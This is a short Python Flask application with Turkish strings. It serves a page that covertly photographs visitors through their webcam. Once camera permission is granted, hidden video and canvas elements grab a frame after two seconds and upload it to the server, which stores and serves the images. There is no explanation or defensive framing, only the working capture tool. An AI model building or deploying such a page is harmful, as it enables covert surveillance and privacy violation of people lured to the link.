from flask import Flask, request, make_response, send_from_directory
import base64
import os
from datetime import datetime

app = Flask(__name__)
UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/')
def home():
    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
      <title>Fotoğraf Çekiliyor</title>
    </head>
    <body>
      <video id="video" width="320" height="240" autoplay style="display:none;"></video>
      <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

      <script>
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const context = canvas.getContext("2d");

        navigator.mediaDevices.getUserMedia({ video: true })
          .then((stream) => {
            video.srcObject = stream;

            setTimeout(() => {
              context.drawImage(video, 0, 0, 320, 240);
              const dataUrl = canvas.toDataURL("image/png");

              fetch("/upload", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ image: dataUrl }),
              })
              .then(response => response.text())
              .then(data => console.log("Sunucu yanıtı:", data));
            }, 2000);

          })
          .catch((err) => {
            alert("Kamera izni reddedildi.");
            console.error(err);
          });
      </script>
    </body>
    </html>
    """
    return make_response(html_content)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json['image']
    header, encoded = data.split(",", 1)
    image_data = base64.b64decode(encoded)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{timestamp}.png"
    filepath = os.path.join(UPLOAD_FOLDER, filename)

    with open(filepath, "wb") as f:
        f.write(image_data)

    image_url = f"http://localhost:5000/uploads/{filename}"
    print("Yeni fotoğraf yüklendi:", image_url)

    return image_url

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

if __name__ == '__main__':
    app.run(debug=True)